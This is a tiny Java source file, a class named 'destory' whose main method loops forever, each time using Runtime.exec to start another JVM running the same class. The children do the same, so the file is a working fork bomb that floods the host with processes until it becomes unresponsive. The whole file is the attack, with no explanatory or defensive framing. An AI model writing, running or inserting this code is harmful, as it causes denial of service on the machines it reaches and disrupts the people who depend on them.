public class destory {
    public static void main(String[] args) throws Exception{
        Runtime r = Runtime.getRuntime();
        boolean a = true;
        Process p;
        while(a){
            p = r.exec("java -cp src destory");
        }
    }
}
